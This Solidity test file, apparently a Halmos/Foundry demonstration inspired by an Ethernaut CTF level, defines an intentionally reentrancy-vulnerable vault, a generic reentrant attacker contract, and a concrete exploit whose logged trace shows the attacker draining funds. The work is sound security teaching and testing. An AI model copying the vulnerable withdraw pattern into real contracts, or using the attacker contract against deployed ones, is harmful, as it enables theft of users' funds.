// SPDX-License-Identifier: MIT
// contributed by @karmacoma on 5 Aug 2023

pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
// import {console2} from "ds-test/console2.sol";

// inspired by the classic reentrancy level in Ethernaut CTF
contract BadVault {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;

        // console2.log("deposit", msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        // checks
        uint256 _balance = balance[msg.sender];
        require(_balance >= amount, "insufficient balance");

        // console2.log("withdraw", msg.sender, amount);

        // interactions
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");

        // effects
        balance[msg.sender] = _balance - amount;
    }
}

// from https://github.com/mds1/multicall
struct Call3Value {
    address target;
    uint256 value;
    bytes data;
}

contract ExploitLaunchPad {
    address public owner;
    bool reentered;

    Call3Value public call;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        if (reentered) {
            return;
        }

        require(call.value <= address(this).balance, "insufficient balance");

        reentered = true;
        (bool success,) = call.target.call{value: call.value}(call.data);
        reentered = false;
    }

    function defer(Call3Value calldata _call) external payable {
        require(msg.sender == owner, "only owner");
        call = _call;
    }

    function go(Call3Value calldata _call)
        external
        payable
    {
        require(msg.sender == owner, "only owner");
        require(_call.value <= address(this).balance, "insufficient balance");

        (bool success,) = _call.target.call{value: _call.value}(_call.data);
    }

    function deposit() external payable {}

    function withdraw() external {
        owner.call{value: address(this).balance}("");
    }
}

contract BadVaultTest is Test {
    BadVault vault;
    ExploitLaunchPad exploit;

    address user1;
    address user2;
    address attacker;

    function setUp() public {
        vault = new BadVault();

        user1 = address(1);
        user2 = address(2);

        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        vm.deal(user2, 1 ether);
        vm.prank(user2);
        vault.deposit{value: 1 ether}();

        attacker = address(42);
        vm.prank(attacker);
        exploit = new ExploitLaunchPad();

        assert(exploit.owner() == attacker);
    }

    /// @custom:halmos --array-lengths data1=36,data2=36,deferredData=36
    function prove_BadVault_usingExploitLaunchPad(
        address target1,
        uint256 amount1,
        bytes memory data1,

        address target2,
        uint256 amount2,
        bytes memory data2,

        address deferredTarget,
        uint256 deferredAmount,
        bytes memory deferredData

    ) public {
        uint256 STARTING_BALANCE = 2 ether;
        vm.deal(attacker, STARTING_BALANCE);

        vm.assume(address(exploit).balance == 0);
        vm.assume((amount1 + amount2) <= STARTING_BALANCE);

        // console2.log("attacker starting balance", address(attacker).balance);
        vm.prank(attacker);
        exploit.deposit{value: STARTING_BALANCE}();

        vm.prank(attacker);
        exploit.go(Call3Value({
            target: target1,
            value: amount1,
            data: data1
        }));

        vm.prank(attacker);
        exploit.defer(Call3Value({
            target: deferredTarget,
            value: deferredAmount,
            data: deferredData
        }));

        vm.prank(attacker);
        exploit.go(Call3Value({
            target: target2,
            value: amount2,
            data: data2
        }));

        vm.prank(attacker);
        exploit.withdraw();

        // they can not end up with more ether than they started with
        // console2.log("attacker final balance", address(attacker).balance);
        assert(attacker.balance <= STARTING_BALANCE);
    }

    // running `forge test --match-test test_BadVault_solution -vvv` confirms the attack trace:                                                                                                                                                                            took 6s Node system at 18:00:43
    //   deposit 0x0000000000000000000000000000000000000001 1000000000000000000
    //   deposit 0x0000000000000000000000000000000000000002 1000000000000000000
    //   attacker starting balance 2000000000000000000
    //   deposit 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
    //   attacker final balance 3000000000000000000
    function test_BadVault_solution() public {
        prove_BadVault_usingExploitLaunchPad(
            // 1st call
            address(vault),
            1 ether,
            abi.encodeWithSelector(
                vault.deposit.selector
            ),

            // 2nd call
            address(vault),
            0 ether,
            abi.encodeWithSelector(
                vault.withdraw.selector,
                1 ether
            ),

            // deferred call
            address(vault),
            0 ether,
            abi.encodeWithSelector(
                vault.withdraw.selector,
                1 ether
            )
        );
    }
}
